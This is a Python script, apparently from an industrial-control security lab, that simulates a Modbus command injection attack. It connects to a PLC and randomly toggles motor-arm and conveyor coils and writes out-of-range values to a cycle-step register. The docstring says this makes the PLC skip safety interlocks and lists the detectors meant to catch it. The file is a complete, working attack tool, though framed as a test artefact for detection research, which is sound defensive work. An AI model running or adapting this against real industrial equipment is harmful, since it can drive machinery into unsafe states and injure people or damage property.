#!/usr/bin/env python3
"""
Modbus command injection attack simulator.

Writes to coils that the legitimate baseline never writes. Models the
"command injection" family of ICS attacks (HAI/SWaT label "Type-A2").

What it does:
  * Toggles coil 0 (motor_arm_enable) and coil 2 (conveyor_run) at random.
  * Writes anomalous values to holding register 0 (cycle_step), tricking
    the production PLC into skipping safety-relevant interlocks.

What detects it:
  * Suricata rule lab-modbus-001 (write to motor_arm_enable from non-HMI).
  * Stage 2 RandomForest classifier (feature: src_ip != known HMI list).
  * Stage 3 Safety Supervisor independent of either, asserts safe state
    when production PLC reports unexpected step transitions.

This script is a deliberate test artefact. Do not run against equipment
that actually moves people or damages property.

Run:
    python3 attack_modbus_inject.py --host 192.168.10.10 --duration-s 20
"""
from __future__ import annotations

import argparse
import logging
import random
import signal
import sys
import time
from dataclasses import dataclass
from typing import List

try:
    from pymodbus.client import ModbusTcpClient
except ImportError as exc:
    print(f'pymodbus not installed: {exc}', file=sys.stderr)
    sys.exit(2)

LOG = logging.getLogger('attack_modbus_inject')


@dataclass
class Args:
    host: str
    port: int
    unit_id: int
    duration_s: float
    rate_hz: float


def _parse_args(argv: List[str]) -> Args:
    p = argparse.ArgumentParser(description=__doc__.split('\n')[0])
    p.add_argument('--host', required=True)
    p.add_argument('--port', type=int, default=502)
    p.add_argument('--unit-id', type=int, default=1)
    p.add_argument('--duration-s', type=float, default=20.0)
    p.add_argument('--rate-hz', type=float, default=8.0)
    p.add_argument('--log-level', default='INFO',
                   choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'])
    ns = p.parse_args(argv)
    logging.basicConfig(
        level=getattr(logging, ns.log_level),
        format='%(asctime)s %(name)s %(levelname)s %(message)s',
    )
    if ns.rate_hz <= 0 or ns.rate_hz > 50:
        p.error('--rate-hz must be in (0, 50]')
    if ns.duration_s <= 0:
        p.error('--duration-s must be > 0')
    return Args(
        host=ns.host, port=ns.port, unit_id=ns.unit_id,
        duration_s=ns.duration_s, rate_hz=ns.rate_hz,
    )


_EXIT = False


def _sigterm(*_a) -> None:
    global _EXIT  # noqa: PLW0603
    _EXIT = True


def main(argv: List[str]) -> int:
    args = _parse_args(argv)
    signal.signal(signal.SIGINT, _sigterm)
    signal.signal(signal.SIGTERM, _sigterm)
    rng = random.Random(42)  # deterministic for repro

    LOG.warning(
        'STARTING INJECTION ATTACK SIM: target=%s rate=%.1f Hz duration=%.0fs',
        args.host, args.rate_hz, args.duration_s,
    )

    client = ModbusTcpClient(host=args.host, port=args.port, timeout=2.0)
    if not client.connect():
        LOG.error('cannot connect to %s:%d', args.host, args.port)
        return 1

    period = 1.0 / args.rate_hz
    started = time.monotonic()
    ok = err = 0
    try:
        while not _EXIT and (time.monotonic() - started) < args.duration_s:
            t0 = time.monotonic()
            try:
                # 60% chance: toggle a control coil at random
                if rng.random() < 0.6:
                    coil_addr = rng.choice([0, 2])    # motor_arm_enable, conveyor_run
                    state = rng.choice([True, False])
                    rr = client.write_coil(
                        address=coil_addr, value=state, slave=args.unit_id,
                    )
                else:
                    # 40% chance: write a wild value to the cycle_step register
                    bad = rng.randint(7, 65535)       # legitimate range is 0..6
                    rr = client.write_register(
                        address=0, value=bad, slave=args.unit_id,
                    )

                if rr.isError():
                    err += 1
                    LOG.warning('error: %s', rr)
                else:
                    ok += 1
            except Exception as exc:
                err += 1
                LOG.warning('exception: %s', exc)

            sleep = period - (time.monotonic() - t0)
            if sleep > 0:
                time.sleep(sleep)
    finally:
        try:
            client.close()
        except Exception:
            pass

    LOG.warning(
        'INJECTION DONE: ok=%d err=%d elapsed=%.1fs',
        ok, err, time.monotonic() - started,
    )
    return 0


if __name__ == '__main__':
    sys.exit(main(sys.argv[1:]))
